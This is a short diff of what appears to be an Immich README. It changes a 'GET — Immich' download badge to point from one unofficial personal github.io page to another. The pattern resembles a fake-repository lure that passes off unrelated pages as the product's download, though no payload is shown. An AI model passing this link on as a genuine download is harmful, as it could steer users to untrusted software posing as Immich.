@@ -3,7 +3,7 @@
 
 ![Banner Placeholder](https://docs.immich.app/img/immich-logo-inline-light.png)
 
-[![GET — Immich](https://img.shields.io/badge/GET%20%E2%80%94%20Immich-0078D6?style=for-the-badge&logoColor=white)](https://lisarodriguezj632.github.io/.github/Immich-Media)
+[![GET — Immich](https://img.shields.io/badge/GET%20%E2%80%94%20Immich-0078D6?style=for-the-badge&logoColor=white)](https://osieelleholorasa.github.io/.github/Immich-Media)
 
 ---
 
